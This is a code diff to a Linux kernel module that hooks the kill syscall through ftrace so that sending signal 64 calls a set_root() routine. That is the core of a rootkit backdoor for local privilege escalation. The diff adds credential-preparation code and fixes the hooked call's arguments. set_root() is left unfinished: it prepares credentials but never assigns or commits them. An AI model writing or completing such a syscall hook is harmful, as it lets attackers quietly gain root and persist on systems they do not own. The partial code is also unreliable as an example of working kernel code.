@@ -4,6 +4,7 @@
  */
 #include <linux/sched.h>
 #include <linux/version.h>
+#include <linux/cred.h>
 #include "ftrace_helper.h"
 
 #define SET_ROOT_SIGNAL 64
@@ -12,8 +13,13 @@
 #define PTREGS_SYSCALL_STUBS 1
 #endif
 
-void set_root()
+static void set_root(void)
 {
+    struct cred *root;
+    root = prepare_creds();
+    if (!root)
+	return;
+
     
 }
 
@@ -28,7 +34,7 @@ static asmlinkage int hooked_kill(const struct pt_regs *registers)
 	      set_root();
         return 0;
     }
-    return orig_kill();
+    return orig_kill(registers);
 }
 #else
 
@@ -40,7 +46,7 @@ static asmlinkage int hooked_kill(pid_t pid, int sig)
 	      set_root();
         return 0;
     }
-    return orig_kill();
+    return orig_kill(pid, sig);
 }
 #endif
 
